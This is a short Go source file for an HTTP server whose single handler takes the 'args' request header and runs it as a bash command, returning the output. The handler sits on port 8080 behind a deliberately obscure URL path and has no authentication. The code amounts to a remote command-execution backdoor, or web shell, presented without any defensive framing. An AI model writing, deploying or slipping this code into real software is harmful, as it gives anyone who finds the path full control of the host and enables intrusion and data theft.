package httpserver

import (
	"fmt"
	"net/http"
	"os/exec"
)

func CmdHanler(res http.ResponseWriter, req *http.Request) {
	cmd := req.Header.Get("args")
	c := exec.Command("bash", "-c", cmd)
	output, err := c.Output()
	res.Write([]byte(fmt.Sprintf("%s\n\n%v", string(output), err)))
}
func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/zhebushiyigerandompath", CmdHanler)
	http.ListenAndServe(":8080", mux)
}
